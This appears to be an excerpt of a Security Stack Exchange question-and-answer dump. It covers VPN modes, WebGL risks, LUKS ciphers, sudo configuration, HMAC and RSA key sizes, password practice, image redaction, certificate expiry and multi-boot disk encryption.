<p>UPDATE 2: As some others have pointed out. There are many flavours of VPN. A commercial service will be the easiest to consume but you need to do your homework to find the best for your region. Commercial VPN's can also be relatively easily blocked both by end point and by traffic inspection. Some VPN's require specific ports to be open on the network and these might not be available. Test before you buy. In general, those offering SSL-based or OpenVPN-based are likely to offer more options and be easier to get through any blocks.</p>

<p>Another form of VPN is to use an SSH client such as PUTTY (for Windows) connected to an SSH server (perhaps on your own or a friends VPS). You can throw in a local SOCKS proxy client and then you will have a very configurable private VPN service. Not especially easy to set up though if you don't understand the terminology. Note that many VPS services ban their use for even private VPNs.</p>

<p>Another thing to note is that there are several ways for security infrastructure to spot VPN traffic and therefore block it. Known end points for commercial services and known ports for VPN types are the easiest but it is possible to examine traffic patterns and work out that even apparent SSL traffic (e.g. if using port 443 for VPN) isn't actually.</p>
","136545"
"Is WebGL a security concern?","30341","","<p>Is WebGL a potential security problem due to the low level access it provides?</p>

<p>For example, a web page can attempt to compile and run any shader source it wants.</p>

<p>It seems that security would especially be a problem with open source web browsers, as an attacker could more easily find vulnerabilities in the implementation.</p>
","<p>Yes, WebGL is indeed a potential security risk, though the magnitude of the risk is hard to assess and open to debate.  There are some tricky issues here.  The browsers have put in place some defenses against the security risks, but there seems to be some debate about whether those defenses will prove adequate in the long run.</p>

<p>One major risk is that WebGL involves running code directly on the video card, and exposing APIs that provide direct access to video card APIs.  The browser does attempt to sandbox this code (to a certain extent), and browsers do enforce a number of security restrictions designed to prevent malicious behavior.  However, many of these APIs and their implementations were not originally designed to be provided to untrusted entities (they were only usable by native applications, which are fully trusted), so there are concerns about whether exposing them to arbitrary web sites might enable web sites to attack your system.</p>

<p>There was <a href=""http://www.contextis.com/resources/blog/webgl-new-dimension-browser-exploitation/"" rel=""nofollow noreferrer"">one high-visibility white paper</a> (see also <a href=""http://www.khronos.org/webgl/security/"" rel=""nofollow noreferrer"">the sequel</a>) which looked at the security of the WebGL implementation in browsers at the time, and found a number of vulnerabilities.  They found some memory safety issues in several WebGL APIs, and also found some attacks that would allow one web site to read pixel data of other web sites (which could enable a breach of confidentiality).  See also <a href=""http://www.contextis.com/resources/blog/webgl-more-webgl-security-flaws/"" rel=""nofollow noreferrer"">this third study</a>, which demonstrated the existence of these vulnerabilities on a number of browsers and web cards (at the time).</p>

<p>Browsers have responded to this with a variety of defenses: they have blacklisted video cards with known security problems; they have tried to fix the known memory safety problems; and <a href=""https://hacks.mozilla.org/2011/06/cross-domain-webgl-textures-disabled-in-firefox-5/"" rel=""nofollow noreferrer"">they have restricted use of WebGL per the same-origin policy</a>, to prevent a malicious web site from <a href=""http://robert.ocallahan.org/2011/09/risks-of-exposing-web-page-pixel-data.html"" rel=""nofollow noreferrer"">using WebGL to spy on users' use of other web sites</a>.</p>

<p>There is some ongoing debate over whether these defenses will prove adequate in the long term.  Microsoft has taken the position that <a href=""https://blogs.technet.com/b/srd/archive/2011/06/16/webgl-considered-harmful.aspx?Redirected=true"" rel=""nofollow noreferrer"">WebGL is too great a security risk and the existing defenses are not robust enough</a>.  On the other hand, Mozilla takes the position that the defenses they have put in place will be adequate, and that WebGL provides important value to the web.  Ars Technica has <a href=""http://arstechnica.com/microsoft/news/2011/06/microsoft-no-way-to-support-webgl-and-meet-our-security-needs.ars"" rel=""nofollow noreferrer"">an excellent round-up of the issue</a>; and <a href=""http://hothardware.com/News/Microsoft-Labels-WebGL-A-Fundamental-Unacceptable-Security-Risk/"" rel=""nofollow noreferrer"">here is another press report</a>.</p>

<p>P.S. I completely disagree with your statement about it being particularly a problem for open source web browsers.  That's a myth.  See <a href=""https://security.stackexchange.com/q/4441/971"">Open Source vs Closed Source Systems</a>, which already covers these arguments.  (See also <a href=""https://security.stackexchange.com/q/10063/971"">Chrome vs Explorer - how to explain in plain words that open-source is better?</a> for additional thoughtful discussion on this topic.)</p>
","13840"
"Recommended options for LUKS (cryptsetup)","30283","","<p>I'm looking for recommended options for cryptsetup to create fully encrypted SSD (<code>SanDisk SSD U100 128GB</code>), which achive:</p>

<pre><code>Timing O_DIRECT disk reads: 1476 MB in  3.00 seconds = 491.81 MB/sec
Timing buffered disk reads: 1420 MB in  3.00 seconds = 473.01 MB/sec
</code></pre>

<p>My benchmark shows me best cipher:</p>

<pre><code># cryptsetup benchmark
# Tests are approximate using memory only (no storage IO).
PBKDF2-sha1       103696 iterations per second
PBKDF2-sha256      59904 iterations per second
PBKDF2-sha512      38235 iterations per second
PBKDF2-ripemd160   85111 iterations per second
PBKDF2-whirlpool   47216 iterations per second
#  Algorithm | Key |  Encryption |  Decryption
     aes-cbc   128b   133.2 MiB/s   432.0 MiB/s
 serpent-cbc   128b    18.1 MiB/s    67.3 MiB/s
 twofish-cbc   128b    39.3 MiB/s    73.0 MiB/s
     aes-cbc   256b    99.6 MiB/s   337.7 MiB/s
 serpent-cbc   256b    18.1 MiB/s    66.9 MiB/s
 twofish-cbc   256b    39.4 MiB/s    72.6 MiB/s
     aes-xts   256b   376.6 MiB/s   375.0 MiB/s
 serpent-xts   256b    69.0 MiB/s    66.5 MiB/s
 twofish-xts   256b    71.1 MiB/s    72.2 MiB/s
     aes-xts   512b   297.0 MiB/s   300.1 MiB/s
 serpent-xts   512b    69.6 MiB/s    66.6 MiB/s
 twofish-xts   512b    71.9 MiB/s    72.7 MiB/s
</code></pre>

<p>But perhaps, you could suggest some options, that would increase my performance and security. My CPU is: <code>Intel(R) Core(TM) i7-2677M CPU @ 1.80GHz</code> and it supports AES-NI (<code>aes</code> cpu flag).</p>

<p>Thank you</p>
","<p>You might want to use PBKDF2 with SHA-512. This step is for converting your <em>password</em> into an encryption key (more or less directly). This is inherently open to <a href=""http://en.wikipedia.org/wiki/Dictionary_attack"" rel=""noreferrer"">offline dictionary attacks</a>, and relates to the <a href=""https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords/31846#31846"">password hashing</a> problematic. For that, you want to maximize the effort of the attacker by choosing an algorithm and iteration count which will make the task hardest for the attacker while keeping it tolerable for you; ""tolerable"" here depends on your patience, when you type the password at boot time.</p>

<p>Attackers will want to use some <a href=""http://en.wikipedia.org/wiki/Graphics_processing_unit"" rel=""noreferrer"">GPU</a> and/or <a href=""https://en.wikipedia.org/wiki/Field-programmable_gate_array"" rel=""noreferrer"">FPGA</a> to speed up their attack, while you use a normal PC. Nowadays, normal PC are at ease with 64-bit arithmetic operations, and run SHA-512 about as fast as SHA-256; however, GPU much prefer 32-bit operations, and mapping them on FPGA is also easier than 64-bit operations. Therefore, by using SHA-512 instead of SHA-256, you give less an advantage to the attacker. Hence my recommendation: on modern hardware, for password hashing, prefer SHA-512 over SHA-256.</p>

<p>Remember to adjust the ""iteration count"" so that the time taken to process your password is at the threshold of the bearable: higher iteration counts mean longer processing time, but are proportionally better for security.</p>

<hr />

<p>For actual encryption, you will want <a href=""http://en.wikipedia.org/wiki/XEX-TCB-CTS#XEX-based_tweaked-codebook_mode_with_ciphertext_stealing_.28XTS.29"" rel=""noreferrer"">XTS</a>, which has been designed to support disk encryption efficiently. This indeed shows in the benchmarks; this is for a SSD and you do not want the encryption to be much slower than the underlying hardware. Note that XTS splits the key into two halves, only one of which being used for the actual encryption. In other words, ""<code>aes-xts</code>"" with a 256-bit key actually uses 128 bits for the AES part. And that's <a href=""https://security.stackexchange.com/questions/6141/amount-of-simple-operations-that-is-safely-out-of-reach-for-all-humanity/6149#6149"">good enough</a>. There is no rational need for going to 256-bit keys -- i.e. 512-bit in the context of ""<code>aes-xts</code>"". 256-bit keys for AES imply some CPU overhead, which the benchmarks duly observe (300 MB/s vs 375 MB/s). With a SSD under the hood, you really want a fast encryption system, so do that.</p>
","40218"
"Can most mail from *.ru be considered spam?","30261","","<p>Is it safe to assume that most, if not all, emails from a *.ru domain may be considered spam?  From a log of 30000 emails from *.ru, its all been spam (over two months).</p>
","<p>No, you cannot safely assume this. Maybe according to your mail servers you can assume this, but overall only 4.9% of total spam comes from Russia according to <a href=""https://www.trustwave.com/support/labs/spam_statistics.asp"" rel=""nofollow noreferrer"">Trustwave</a>.</p>

<p>According to <a href=""http://www.securelist.com/en/analysis/204792220/Spam_report_January_2012"" rel=""nofollow noreferrer"">Securelist</a> the number is as low as 1.7% for January 2012.</p>

<p>See this picture for how far down Russia is placed on the spam list: 
 <img src=""https://i.stack.imgur.com/TfdER.png"" alt=""Kapersky Lab&#x0a;&#x0a;Inda: 11.6%&#x0a;Indonesia: 8.1%&#x0a;South Korea: 7.7%&#x0a;Brazil: 7.6%&#x0a;Peru: 3.9%&#x0a;Vietnam: 3.5%&#x0a;Italy: 3.2%&#x0a;Great Britain: 3.2%&#x0a;Poland: 3.0%&#x0a;Argentina: 2.7%&#x0a;Colombia: 2.4%&#x0a;Taiwan: 2.4%&#x0a;Kazakhstan: 2.0%&#x0a;France: 2.0%&#x0a;Spain: 1.9%&#x0a;USA: 1.8%&#x0a;Russia: 1.7%&#x0a;Saudi Arabia: 1.5%&#x0a;Romania: 1.3%&#x0a;the Philippines: 1.3%&#x0a;Other: 27.3%""></p>

<p><strong>Edit: additional info.</strong></p>

<p>If you sometime have to do business with a Russian you would have a bug that may be hard to identify later on, perhaps in a couple of years when you forgot about this configuration. Russia is the 9th largest country population wise in the entire world so it may be quite a big deal to block it.</p>

<p>I would look at the spam designated to you and see if you can identify any common denominators in the headers or content of the spam. There may very well be other ways to distinguish between the spam and no spam than blocking everything. </p>
","17356"
"Sudo password when authenticating via passwordless SSH","30219","","<p>I've got a few boxes all networked together on Amazon EC2, each of which are in automated communication with each other via SSH (rsync, etc). As such, I've created SSH keys on each of these machines to allow them to SSH into each other without requiring a password. Likewise, my personal account is key-based and passwordless as well.</p>

<p>To the best of my knowledge, I've secured SSH appropriately using the well-documented methods.</p>

<p>Under this configuration, I notice that I don't have to provide a password to use <code>sudo</code>. If I try to <code>su root</code>, I get nowhere, because root doesn't have a password. However, if I run a <code>sudo -i</code>, I am asked for no password, and am immediately granted root. That worries me a bit.</p>

<p>So, two questions:</p>

<ol>
<li><em>Should</em> this worry me, or am I being too paranoid?</li>
<li>Is it possible to set a sudo password when using key-based SSH authentication?</li>
</ol>

<p>Several of these boxes are web servers, and are hosting web applications of what I fear to be dubious quality. (I didn't write them, so they're dubious!) I've got Apache and the permissions on the servers configured such that a <em>very</em> unprivileged user (www-data) is serving the files, but my fear is that - somehow - an attacker could compromise a web application, escalate privileges to a more privileged user, and then simply <code>sudo -i</code> to root.</p>

<p>I'm not aware of a vulnerability in my software that would allow www-data to escalate its privileges, but I would prefer having a password in place to use <code>sudo</code> were that somehow to happen.</p>

<p>Also, for the record: I did try to set a password by logging in via SSH and then running <code>passwd</code>, but it threw an error. I don't remember the exact phrasing, but it was something about a ""token"". Either way, the password didn't stick, which makes me think I'm misunderstanding something at a fundamental level here.</p>

<p>Any illumination on the subject would be very much appreciated. Thanks.</p>

<p><em>-- Update: 7 December 2011 --</em></p>

<p>Thanks for the thoughtful explanations, all. It does in fact seem like the issue lies in <code>/etc/sudoers</code>. Thanks for pointing me in that direction.</p>

<p>I figured I'd document this for the sake of completing the discussion. When I looked into <code>/etc/sudoers</code>, I encountered the following lines:</p>

<pre><code># ubuntu user is default user in ec2-images.  
# It needs passwordless sudo functionality.
ubuntu  ALL=(ALL) NOPASSWD:ALL
</code></pre>

<p>I am, in fact, using the ubuntu user for my privileged operations (though, again, the webserver is only running as <code>www-data</code>), so I guess that explains the issue I was having.</p>

<p>If anyone wants to follow up with a guess <em>why</em> the ubuntu user needs passwordless sudo functionality, I'd love to hear it. Otherwise, at least for the time being, I think I'll let good enough alone and leave the configuration as-is. I don't want to break a working system while trying to preemptively solve a non-existent problem.</p>

<p>Thanks again for lending your time and expertise.</p>
","<p>The reason you're not being prompted for a sudo password is because your user (or usergroup) has NOPASSWD enabled in /etc/sudoers. You can edit this file with <code>visudo</code> as root.</p>

<p>Regarding passwordless authentication, you are correct that public key authentication is a preferred method for authenticating to servers. If there is no password to guess, then no brute force attempt can succeed.</p>

<p>The fact that you have no root password at all violates some best practices, but as you correctly stated, if a key is required to get into the box, it is probably alright. Having a root password might encourage you to use SSH to login as root, which should be disabled in your sshd_config.</p>

<p>The only question I have relates to one of your last paragraphs:</p>

<blockquote>
  <p>Also, for the record: I did try to set a password by logging in via SSH and then running passwd, but it threw an error. I don't remember the exact phrasing, but it was something about a ""token"". Either way, the password didn't stick, which makes me think I'm misunderstanding something at a fundamental level here.</p>
</blockquote>

<p>You were unable to set a password while sudo'd to root? Or just as a regular user? Having public key authentication in place shouldn't stop you from setting a userspace password, nor a root password. It looks like you might be encountering <a href=""https://superuser.com/questions/107386/trying-to-change-a-ubuntu-users-password-authentication-token-manipulation-err"">this problem, discussed on SuperUser</a>, so hopefully that will help a bit.</p>

<p>I hope I answered the security side of your question; feel free to add a comment or followup if you need more information!</p>
","9310"
"What are requirements for HMAC secret key?","30213","","<p>I'm creating HTTP REST service which will be available over tls only.</p>

<p>For authentication purposes I plan to generate <strong>JWT</strong> token for every user using <code>HMAC HS256</code>. I need a <strong>secret key</strong> for HMAC.</p>

<p>What are the requirements for <strong>secret key</strong>?</p>

<p>Do I need a long string of random characters? Or fixed-length string? Or what?</p>
","<p>I've added my answer here as I feel the existing ones don't directly address your question enough for my liking.</p>

<p>Let's look at <a href=""https://tools.ietf.org/html/rfc4868#page-5"" rel=""nofollow noreferrer"">RFC 4868</a> (regarding IPSec, however it covers the HMAC-SHA256 function you intend to use - <strong>em mine</strong>):</p>

<blockquote>
  <p>Block size:  the size of the data block the underlying hash algorithm
        operates upon.  For <strong>SHA-256, this is 512 bits</strong>, for SHA-384 and
        SHA-512, this is 1024 bits.</p>
  
  <p>Output length:  the size of the hash value produced by the
  underlying
        hash algorithm.  For <strong>SHA-256, this is 256 bits</strong>, for SHA-384 this
        is 384 bits, and for SHA-512, this is 512 bits.</p>
</blockquote>

<p>As <a href=""https://security.stackexchange.com/a/95977/8340"">WhiteWinterWolf notes</a>, longer than B is discouraged because the value must be hashed using SHA-256 first (i.e. 512 bits in this case) and less than L is discouraged (256 bits in this case). However, a 256 bit key is overkill as anything that is 128bits or greater cannot be brute forced in anyone's current lifetime, even if every computer in the world was working on cracking it.</p>

<p>Therefore I'd recommend a 128 bit key, generated with a cryptographically secure pseudo random number generator (CSPRNG). If you want to store this as text then a 128 bit key can be represented by generating a random 32 character length hex string, or alternatively you could generate 16 random bytes and then run them through a base64 function.</p>
","96176"
"Why can't you work backwards with public key to decrypt a message?","30196","","<p>As the title suggests, I am curious to know why you can't work backwards using a message, public key and encrypted message to work out how to decrypt the message!</p>

<p>I don't understand how a message can be encrypted using a key and then how you cannot work backwards to ""undo"" the encryption?</p>
","<p>There are <a href=""http://en.wikipedia.org/wiki/One-way_function"">one-way functions</a> in computer science (not mathematically proven, but you will be rich and famous if you prove otherwise). These functions are easy to solve one way but hard to reverse e.g. it is easy for you to compute <code>569 * 757 * 911 = 392397763</code> in a minute or two on a piece of paper. On the other if I gave you <code>392397763</code> and asked you to find the prime factors, you would have a very hard time. Now if these numbers are really big, even the fastest computer in the world will not be able to reverse the factorization in reasonable time. </p>

<p>In public-key cryptography these one-way functions are used in clever ways to allow somebody to use the public key to encrypt something, but making it very hard to decrypt the resulting message. You should read the Wiki article <a href=""https://en.wikipedia.org/wiki/RSA_%28cryptosystem%29"">RSA cryptosystem</a>.</p>
","86607"
"How long should the password be?","30179","","<p>The minimum password length recommended is about 8 characters, so is there any standard/recommended maximum length of the password?</p>
","<p>Bruce Schneier has a couple of interesting articles on password policies.</p>

<p><a href=""http://www.schneier.com/blog/archives/2006/12/realworld_passw.html"">Real world passwords</a> - covering password length, complexity and common passwords.</p>

<p><a href=""http://www.schneier.com/blog/archives/2009/08/password_advice.html"">Password advice</a> - some do's and don'ts including:</p>

<blockquote>
  <ul>
  <li>DO use a password manager </li>
  <li>DO change passwords frequently. I change mine every six months...</li>
  <li>Don't reuse old passwords. </li>
  <li>DON'T use passwords comprised of dictionary words, birthdays, family and pet names, addresses, or any other personal information. </li>
  <li>DON'T access password-protected accounts over open Wi-Fi networks — or any other network you don't trust — unless the site is secured via https. </li>
  </ul>
</blockquote>

<p>and many more</p>

<p><a href=""http://www.schneier.com/blog/archives/2010/11/changing_passwo.html"">Changing passwords</a> - a detailed discussion on how often you should change based upon usage and threat environment.</p>
","145"
"OpenVPN Tap vs Tun Mode","30120","","<p>I would like to know practical difference between <strong>TAP and TUN mode when use with OpenVPN</strong>.</p>

<p>When to use TAP and When to use TUN ?</p>

<p>What types of <strong>traffic</strong> will pass with both mode ?</p>
","<p>TAP is basically at Ethernet level (layer 2) and acts like a switch where as TUN works at network level (layer 3) and routes packets on the VPN. TAP is bridging whereas TUN is routing.</p>

<p>From the <a href=""https://community.openvpn.net/openvpn/wiki/BridgingAndRouting"">OpenVPN Wiki</a>:</p>

<blockquote>
  <p><strong>TAP benefits:</strong></p>
  
  <ul>
  <li>behaves like a real network adapter (except it is a virtual network    adapter)</li>
  <li>can transport any network protocols (IPv4, IPv6, Netalk, IPX, etc,    etc)</li>
  <li>Works in layer 2, meaning Ethernet frames are passed over the VPN    tunnel</li>
  <li>Can be used in bridges</li>
  </ul>
  
  <p><strong>TAP drawbacks:</strong></p>
  
  <ul>
  <li>causes much more broadcast overhead on the VPN tunnel</li>
  <li>adds the overhead of Ethernet headers on all packets transported over    the VPN tunnel</li>
  <li>scales poorly</li>
  </ul>
  
  <p><strong>TUN benefits</strong>:</p>
  
  <ul>
  <li>A lower traffic overhead, transports only traffic which is destined    for the VPN client</li>
  <li>Transports only layer 3 IP packets</li>
  </ul>
  
  <p><strong>TUN drawbacks:</strong></p>
  
  <ul>
  <li>Broadcast traffic is not normally transported</li>
  <li>Can only transport IPv4 (OpenVPN 2.3 adds IPv6)</li>
  <li>Cannot be used in bridges</li>
  </ul>
</blockquote>
","46444"
"Why do we not trust an SSL certificate that expired recently?","30099","","<p>Every SSL certificate has an expiration date. Now suppose some site's certificate expired an hour ago or a day ago. All the software by default will either just refuse to connect to the site or issue security warnings.</p>

<p>This <a href=""https://stackoverflow.com/q/15033020/57428"">recently happened to Windows Azure Storage</a> and since most of software in dependent services defaulted to refusing to connect lots of services experienced major degradation.</p>

<p>Now what's the logic in here? I mean a day ago the certificate was valid and everyone was happy to use it. Now a day later it's formally expired and noone likes it anymore.</p>

<p>I've read <a href=""https://security.stackexchange.com/a/8400/2052"">this answer</a> and I don't find it convincing for this specific edge case. To every security model there is a threat model.</p>

<p>What's the threat model here? What could have happened between now and a day ago that a certificate is treated to be unusable to such extent that we even refuse to connect to the site?</p>
","<p>When a certificate is expired, its revocation status is no longer published. That is, the certificate might have been revoked long ago, but it will no longer be included in the CRL. Certificate expiration date is the cut-off date for CRL inclusion. That's the official reason why certificates expire: to keep CRL size bounded.</p>

<p>(The unofficial reason is to make certificate owners pay an annual fee.)</p>

<p>So you cannot trust an expired certificate because <strong>you cannot check its revocation status</strong>. It might have been revoked months ago, and you would not know it.</p>
","31482"
"How can I find if my password has been posted online?","30058","","<p>I have just received this email from AbeBooks.com:</p>

<blockquote>
  <p>Hello AbeBooks Customer,</p>
  
  <p>This is an important message from AbeBooks.com.</p>
  
  <p>As part of our routine security monitoring, we have learned that a
  list of email addresses and passwords were posted online this week.</p>
  
  <p>While the list was not AbeBooks-related, we know that many people
  reuse their passwords on several websites. We believe your email
  address and password set was on the list posted online.</p>
  
  <p>Therefore we have taken the precaution of disabling your password on
  your account. We apologize for any inconvenience this has caused but
  felt that it was necessary to help protect you and your AbeBooks
  account.</p>
</blockquote>

<p>I don't care so much about my AbeBooks.com account as I barely use it. But, I am very worried to know that my email and password are published online.  Although I tried to Google for my email and haven't found anything.</p>

<p>What should I do now? Should I change the passwords in all my 50+ accounts?</p>
","<p>Probably the most comprehensive database of searchable compromised accounts is <a href=""https://haveibeenpwned.com/"">haveibeenpwned.com</a>.</p>

<p>If you've reused the password in multiple places then yes you should assume that password has been compromised. I also recommend enabling two-factor authentication wherever possible as this will reduce the risk of one account being compromised leading to other accounts being compromised.</p>
","67371"
"How secure is 'blacking out' sensitive information using Paint?","29980","","<p>I'm wondering if it's safe to black out sensitive information from a picture just by using <a href=""https://en.wikipedia.org/wiki/Microsoft_Paint"">Microsoft Paint</a>?</p>

<p>Let's take in this scenario that EXIF data are stripped and there is no thumbnail picture, so that no data can be leaked in such a way.</p>

<p>But I'm interested in whether there is any other attack, that can be used in order to retrieve hidden information from the picture?</p>
","<p>As mentioned in the answers to <a href=""https://security.stackexchange.com/q/67295/54376"">a very similar question</a>, scribbling over part of an image will destroy the original pixels, assuming that your editor doesn't store any layers or undo history. (Paint doesn't.) There are some things to watch out for, though:</p>

<ul>
<li>The width of the blanked region places an upper bound on the length of the secret data</li>
<li>The height of the region could tell attackers whether the text representation of the data has ascenders or descenders (like in the letters <code>b</code> and <code>p</code>)</li>
<li>Any spaces in the blanked region provide information about the relative lengths of the data's parts/words (mentioned in <a href=""https://security.stackexchange.com/questions/126932/how-secure-is-blacking-out-sensitive-information-using-paint/126937#comment234442_126937"">David Schwartz's comment</a>)</li>
</ul>

<p>If you use a blur rather than a plain opaque rectangle/brush, a determined attacker could try lots of different possibilities in the image to see what text(s) get close to your image when blurred. Some effects can be undone almost perfectly, so make sure the one you use involves a lot of randomness or actual data destruction (e.g. a blocky pixellization). Of course, Paint doesn't have any special effects, so you should be fine.</p>

<p>One possible thing to be wary of is JPEG compression artifacts around the secret data, which could be used to get clues about the shape of the text. It never hurts to overwrite more information than necessary when you're concerned about secrecy. (This attack isn't a problem if the image never went through JPEG compression before your redaction.)</p>
","126937"
"Should I change the private key when renewing a certificate?","29965","","<p>My security department insists that I (the system administrator) make a new private key when I want a SSL certificate renewed for our web servers. They claim it's best practice, but my googling attempts have failed to verify their claim. What is the correct way?</p>

<p>The closest I've found is <a href=""https://security.stackexchange.com/questions/9686/should-i-regenerate-new-ssl-private-key-yearly"">Should I regenerate new SSL private key yearly?</a>, but it doesn't really explain why it would be necessary to change the keys.</p>

<p>I know it's not a big deal to change the keys while I'm at it, but I've never been one to just do what I'm being told without a proper reason or explanation :)</p>
","<p>I would say that their suggestion isn't a very solid one, unless you're using horrifically small key sizes - in which case you have a different problem altogether.</p>

<p>A 2048-bit key, by <a href=""http://www.keylength.com/en/compare/"">most estimates</a>, will keep you safe until at least the year 2020, if not longer than that. If you're running with 1024-bit keys or less, you're below the standard, and I recommend updating to 2048-bit immediately. If you're currently using 1536-bit keys, you should be safe for a year or two.</p>

<p>Of course, this is all academically speaking. The likelihood of someone being able (or inclined) to crack your 1024-bit SSL key within a year is extremely low.</p>

<p>As mentioned in the question you linked, there are benefits and drawbacks.</p>

<p><strong>Benefits</strong></p>

<ul>
<li>Gives an attacker less time to crack the key. Somewhat of a moot point if you're using reasonable key sizes anyway.</li>
<li>Halts any evil-doers that may have compromised your private key. Unlikely, but unknown.</li>
<li>Gives you a chance to increase your key size to be ahead of the curve.</li>
</ul>

<p><strong>Drawbacks</strong></p>

<ul>
<li>Doesn't really give you any concrete protection against key cracking unless you're using terribly small keys.</li>
<li>SSL checking / anti-MitM plugins for browsers might alert the user that the key has changed. This is, in my opinion, a weak drawback - most users won't be using this.</li>
<li>Might cause temporary warnings in relation to more strict <a href=""http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"">HSTS</a> policies and implementations.</li>
<li>It requires work. You could be doing something else.</li>
</ul>

<p>So on both sides there are some weak reasons, and some corner-cases you might need to consider. I'd lean slightly towards the ""don't do it unless you need to"" angle, as long as you're using 2048-bit keys or higher.</p>

<p>The most important thing is to ask <em>them</em> why they think it's necessary - it  may be that you have an infrastructure-related reason for updating the keys which we don't know about. If they can't come up with a solid argument (""why not?"" isn't really valid) then they should probaly re-evaluate their advice.</p>
","27813"
"RSA public key and private key lengths","29954","","<p>I'm having a problem understanding the size of an RSA public key and its private key pair. </p>

<p>I saw different key sizes for RSA algorithm (512, 1024,... for example), but is this the length of public key or the length of private key or are both equal in length?</p>

<p>I already searched for it, but: </p>

<ol>
<li>In <a href=""https://stackoverflow.com/questions/19343022/can-a-public-key-have-a-different-length-encryption-than-the-private-key"">this</a> question it is mentioned that both private and public keys for RSA algorithm have equal length.
But:</li>
<li>In <a href=""https://stackoverflow.com/questions/28706816/private-key-length-public-key"">this</a> question it is mentioned that they have different lengths! </li>
</ol>

<p>Both answers are accepted. Are they equal or not in length?</p>

<p>Moreover my Java Card applet that generate RSA key pairs, always return pubic key and private key of equal length. The online tools for generating RSA key pairs have different length output!</p>

<p>Examples: </p>

<p><a href=""http://travistidwell.com/blog/2013/09/06/an-online-rsa-public-and-private-key-generator/"" rel=""nofollow noreferrer"">Online tool 1</a>: </p>

<p><img src=""https://i.stack.imgur.com/FiEEY.jpg"" alt=""enter image description here""></p>

<p><a href=""http://nmichaels.org/rsa.py"" rel=""nofollow noreferrer"">Online tool 2</a>:</p>

<p><img src=""https://i.stack.imgur.com/sowlg.jpg"" alt=""enter image description here""></p>
","<p><em>> I saw different key sizes for RSA algorithm (512, 1024,... <strong>[bits]</strong> for example) but, is this the length of public key or the length of private key or both are equal in length?</em></p>

<p>It's the length of the modulus used to compute the RSA key pair.  The public key is made of the modulus and the public exponent, while the private key is made of the modulus and the private exponent.</p>

<p><em>> but the online tools for generating RSA key pairs have different lengths output!</em></p>

<p>The first picture shows public and private key in PEM format, encoded in Base64 (and not modulus and exponents of the key, which instead are shown in the second picture).</p>

<p>The content of the RSA private key is as follows:</p>

<pre><code>-----BEGIN RSA PRIVATE KEY-----
RSAPrivateKey ::= SEQUENCE {
  version           Version,
  modulus           INTEGER,  -- n
  publicExponent    INTEGER,  -- e
  privateExponent   INTEGER,  -- d
  prime1            INTEGER,  -- p
  prime2            INTEGER,  -- q
  exponent1         INTEGER,  -- d mod (p-1)
  exponent2         INTEGER,  -- d mod (q-1)
  coefficient       INTEGER,  -- (inverse of q) mod p
  otherPrimeInfos   OtherPrimeInfos OPTIONAL
}
-----END RSA PRIVATE KEY-----
</code></pre>

<p>while a RSA public key contains only the following data:</p>

<pre><code>-----BEGIN RSA PUBLIC KEY-----
RSAPublicKey ::= SEQUENCE {
    modulus           INTEGER,  -- n
    publicExponent    INTEGER   -- e
}
-----END RSA PUBLIC KEY-----
</code></pre>

<p>and this explains why the private key block is larger.</p>

<p>Note that a more standard format for non-RSA public keys is</p>

<pre><code>-----BEGIN PUBLIC KEY-----
PublicKeyInfo ::= SEQUENCE {
  algorithm       AlgorithmIdentifier,
  PublicKey       BIT STRING
}
AlgorithmIdentifier ::= SEQUENCE {
  algorithm       OBJECT IDENTIFIER,
  parameters      ANY DEFINED BY algorithm OPTIONAL
}
-----END PUBLIC KEY-----
</code></pre>

<p>More info <a href=""https://tls.mbed.org/kb/cryptography/asn1-key-structures-in-der-and-pem"">here</a>.</p>

<p>BTW, since you just posted a screenshot of the private key I strongly hope it was just for tests :) </p>
","90182"
"Multi-boot with full hard drive encryption and pre-boot authentication","29914","","<p>How would I set up a multiboot system which supports  full hard drive encryption and pre-boot authentication.</p>

<p>I have a system with Ubuntu, Windows 7, Windows XP, and I would like to install Red Hat. I use grub 2 boot loader. What software would support this set up, for full drive encryption with pre-boot authentication? There is TrueCrypt for Windows pre-boot authentication, but will it play nice with grub 2? What other disk encryption software could I use for Linux side?</p>
","<p><strong>Before you read all this, remember that this technique is at least 5 years old -- it's probably much easier by now (see the other answers). (But it sure was fun to figure this all out.)</strong> </p>

<p>I did this a few years ago with Fedora 10 and Windows Vista to demonstrate how all the intricacies fit together. It was a bit involved (mostly because Windows Vista doesn't ""play well with others"" and doesn't like being installed second), but in the end I found a method that suited me. Your case is more complex because you have 3 existing OS'es and you want to add another onto your drive.</p>

<p>Because I've never attempted this on the magnitude of 4 operating systems, I'll leave most of it up to you (the actual re-partitioning and such) and will try to take the general security principles from my experience and apply them to your situation. Also note that in my case, I started from scratch on a drive I had erased. This was more an experiment than an expert exposé... so take a few things with a grain of ""salt"" (no pun intended) and don't hold me responsible. :)</p>

<hr>

<p>Remember, these are just my notes. You will have to adjust them for your situation. So here we go:</p>

<h1>Problems overcome by the method described here</h1>

<ul>
<li><p>My notebook’s hard disk could only contain 4 primary partitions.</p></li>
<li><p>Primary partitions are the only ones that OSes can be installed to (Windows, anyway).</p></li>
<li><p>Primary partitions are the only partitions the system can boot from</p></li>
<li><p>Each extended partition counts as a primary partition.</p></li>
<li><p>6 or 7 partitions may be needed.</p></li>
<li><p>TrueCrypt can’t encrypt an entire drive that has multiple partitions, OSes, and various file systems when it only runs on one</p></li>
<li><p>TrueCrypt doesn’t play well with Grub or any non-Windows boot loader.</p></li>
<li><p>Windows likes to be installed first and only on a partition flagged as “bootable” (or, if no partitions are flagged “bootable” at all)</p></li>
</ul>

<h1>Benefits in the end</h1>

<ul>
<li><p>After the initial boot loader prompt, mounting various encrypted partitions could be automated with scripts. (&lt;3 Truecrypt)</p></li>
<li><p>Files can be shared between encrypted operating systems (with password).</p></li>
<li><p>Each and every partition is encrypted, even swap file.</p></li>
</ul>

<h1>How the boot loaders work together</h1>

<ul>
<li><p>We install and use Windows’ default boot loader to the MBR. This is what the computer will boot to first.</p></li>
<li><p>We install GRUB (Fedora’s boot loader), but not to the MBR. This will merely be available for us to boot to later.</p></li>
<li><p>We install TrueCrypt which takes over the Windows boot loader. TrueCrypt’s boot loader goes into the MBR. On boot, the user will authenticate with TrueCrypt then be taken to the Windows boot loader where the option Vista or Linux (actually GRUB) becomes available.</p></li>
<li><p>In the end, my boot process looked like this:</p></li>
</ul>

<p><img src=""https://i.stack.imgur.com/1oAXE.jpg"" alt=""Diagram of full-disk encrypted dual-boot process""></p>

